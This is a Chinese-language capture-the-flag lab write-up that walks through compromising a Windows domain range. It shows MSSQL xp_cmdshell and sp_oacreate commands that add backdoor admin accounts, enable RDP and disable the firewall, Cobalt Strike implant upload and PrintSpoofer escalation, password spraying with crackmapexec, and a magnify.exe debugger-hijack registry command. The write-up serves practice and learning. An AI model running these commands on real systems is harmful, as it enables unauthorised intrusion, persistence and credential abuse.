# 春秋云境-Tsclient

首先用fscan扫进行信息搜集

![image-20231203143415212](https://img2023.cnblogs.com/blog/3144128/202312/3144128-20231204163842427-950034100.png)

拿到mssql账号和密码

sa密码为1qaz!QAZ

```
sa权限：数据库操作，文件管理，命令执行，注册表读取等价于system，SQLServer数据库的最高权限
```

我先用navicat进行连接

**开启xp_cmdshell组件**

```
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
```

可以执行

```
exec xp_cmdshell "whoami"
```

这里就想要添加一个普通用户

```
exec xp_cmdshell 'net user hacker 123456 /add'  默认属于 Users 组（普通权限）
```

权限不够，用sp_oacreate进行提权

回顾一下利用条件

**利用条件：**

> 1.已获取到sqlserver sysadmin权限用户的账号与密码且未降权（如2019版本sa用户权限为mssqlserver，已降权）
>
> 2.sqlserver允许远程连接
>
> 3.OLE Automation Procedures选项开启

```
select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE';
--返回1表示存在`sp_oacreate`系统存储过程
EXEC sp_configure 'show advanced options', 1;   
RECONFIGURE WITH OVERRIDE;   
EXEC sp_configure 'Ole Automation Procedures', 1;   
RECONFIGURE WITH OVERRIDE;  
--启用 OLE Automation
DECLARE @o INT;
EXEC sp_oacreate 'wscript.shell', @o OUT;
EXEC sp_oamethod @o, 'run', NULL, 'cmd /c net user sqlbackdoor P@ssw0rd123! /add', 0, TRUE;
EXEC sp_oamethod @o, 'run', NULL, 'cmd /c net localgroup administrators sqlbackdoor /add', 0, TRUE;
--创建高权限用户
EXEC sp_oamethod @o, 'run', NULL, 'cmd /c net user', 0, TRUE;
--查看用户列表


---------可能的后续利用
-- 开启远程桌面
EXEC sp_oamethod @o, 'run', NULL, 'cmd /c reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f', 0, TRUE;

-- 关闭防火墙
EXEC sp_oamethod @o, 'run', NULL, 'cmd /c netsh advfirewall set allprofiles state off', 0, TRUE;
```

这里没有成功添加上管理员用户

于是用MDUT进行连接并上传cs木马上线

这个时候的权限还很低，为了读取flag我们需要进行提权

这里我采用**printspoofer**进行提权

**利用条件**：

在 Beacon 中执行：

```
getprivs
```

输出中**必须包含以下至少一个**：

- ✅ `SeImpersonatePrivilege` ← **最常见（如 MSSQL、IIS AppPool、Local Service 等服务账户通常有）**
- ✅ `SeAssignPrimaryTokenPrivilege`

这里我用甜土豆提权没有成功

```
shell C:\temp\PrintSpoofer64.exe -c "C:\temp\artifact_x64.exe" -i
```

用系统管理员权限上线cs

![image-20231203155842354](https://img2023.cnblogs.com/blog/3144128/202312/3144128-20231204163850926-465401934.png)

-------------------------------------

接着用fscan扫内网（用MDUT上传）

shell net user    查看本地所有用户

shell quser      列出当前**已登录到本机的用户会话**（包括 RDP、控制台、远程 PowerShell 等）

可以发现John通过rdp登录

右键system账号->进程管理->选择john的进程进行进程注入以john用户上线

```
net use    列出当前会话已经连接的共享
```

？为什么会这么像：在内网渗透中，**网络共享（SMB 共享）是信息泄露的“重灾区”**。企业用户习惯把文件放在共享目录中，其中可能有信息泄露

![image-20231203162335688](https://img2023.cnblogs.com/blog/3144128/202312/3144128-20231204163855970-542284436.png)

xiaorang.lab\Aldrich:ald@rLmWuy7Z!#

| 字段              | 内容                   | 含义                                                     |
| ----------------- | ---------------------- | -------------------------------------------------------- |
| **域名 + 用户名** | `xiaorang.lab\Aldrich` | 表示用户 `Aldrich` 属于域 `xiaorang.lab`（可能是内网域） |
| **密码**          | `Ald@rLmWuy7Z!#`       | 这个用户的登录密码（明文！）                             |

配置好代理

知道这个过后就可以进行密码喷洒看看能不能进行其他主机的登录

```
crackmapexec smb 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLmWuy7Z!#'
```

![image-20231203170530394](https://img2023.cnblogs.com/blog/3144128/202312/3144128-20231204163857236-1793503377.png)

STATUS_LPGON_FAILURE,意思是密码已经过期，需要修改，接下来利用impacker中的smbpasswd.py进行修改密码(这个kali自带的没有，文件路径是`/usr/share/doc/python3-impacket/examples/`)

![image-20231203171148345](https://img2023.cnblogs.com/blog/3144128/202312/3144128-20231204163859419-809312622.png)

使用kali进行远程桌面连接

```
xfreerdp3 /v:172.22.8.46 /u:Aldrich /p:'123456qwe.' /d:xiaorang.lab /cert:ignore +auto-reconnect
```

检查windows注册表访问权限

```
Get-ACL -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl
```

放大镜提权

```none
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v "Debugger" /t REG_SZ /d "c:\windows\system32\cmd.exe" /f
```

**这里有个误区**，必须点击锁定用户后在右下角那里使用放大镜，如果在登录状态下使用是无法成功的

接着就可以拿到flag2了

------------------------

flag3需要不出网上线cs